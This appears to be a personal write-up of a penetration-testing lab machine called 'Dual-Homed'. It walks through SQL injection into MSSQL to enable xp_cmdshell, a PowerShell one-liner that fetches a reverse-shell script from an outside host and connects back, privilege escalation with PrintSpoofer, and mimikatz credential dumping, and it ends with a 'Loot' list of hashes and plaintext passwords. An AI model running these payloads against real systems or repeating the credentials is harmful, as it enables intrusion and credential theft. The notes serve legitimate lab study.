<mark>Dual-Homed</mark>
- Website running at port 80 has a login page subjected to SQL injection.![[Pasted image 20240212201416.png]]
- First run to enable Code Execution.
	- URL-encode
	```
	1'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')waitfor delay '0:0:5' -- //
	```
- Then run to receive a reverse shell connection.
	- URL-encode
	```
	1'EXEC master.dbo.xp_cmdshell 'powershell.exe -nop -w hidden -c iex(iwr http://192.168.45.163/Windows/nishang/Shells/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.163 443'waitfor delay '0:0:5' -- //
	```
# PrivEsc
- Since the reverse shell is under the user `nt service\mssql$sqlexpress` which will have `SeImpersonatePrivilege` enable and can be confirmed by `whoami /priv`. Hence, `potato-family` or `printspoofer` can be used her for `PrivEsc`.![[Pasted image 20240212203338.png]]
	- `.\PrintSpoofer64.exe -i -c powershell.exe` to a a shell as `nt authority\system`.
# Local Enumeration
- `winPEAS` identify domain user `joe` with active session.![[Pasted image 20240213161747.png]]![[Pasted image 20240213161912.png]]
- `mimikatz` to extract `NTLM` hash and plaintext password.![[Pasted image 20240213162102.png]]
- Potential `mssql` password![[Pasted image 20240213162542.png]]
- `mimikatz` to dump Local Hashes.
# Loot
- medtech.com\joe
	- `NTLM`: 08d7a47a6f9f66b97b1bae4178747494
	- `Password`: Flowers1
- `Mssql Password` : WhileChirpTuesday218
- `offsec`: 2892d26cdf84d7a70e2eb3b9f05c425e
- `Administrator`: b2c03054c306ac8fc5f9d188710b0168